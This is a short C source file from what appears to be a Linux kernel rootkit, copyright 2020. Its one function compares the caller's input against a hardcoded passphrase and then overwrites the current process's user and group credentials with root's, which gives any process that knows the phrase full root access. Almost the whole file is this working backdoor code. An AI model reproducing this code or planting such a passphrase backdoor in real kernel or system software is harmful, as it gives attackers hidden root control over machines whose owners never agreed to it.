// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "privesc.h"

#include <linux/cred.h>
#include <linux/uaccess.h>

#define PRIVESC_PASS "Hail Satan!"

static struct cred *cred = NULL;


/**
 * satan_privesc_root() - Gives the user's process root credential.
 * @passphrase: rootkit's passphrase for privilege escalation.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_privesc_root(const char *passphrase)
{
        if (strncmp(passphrase, PRIVESC_PASS, strlen(PRIVESC_PASS)))
                return 1;

        cred = (struct cred *) __task_cred(current);

        if (!cred)
                return 1;

        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        return 0;
}
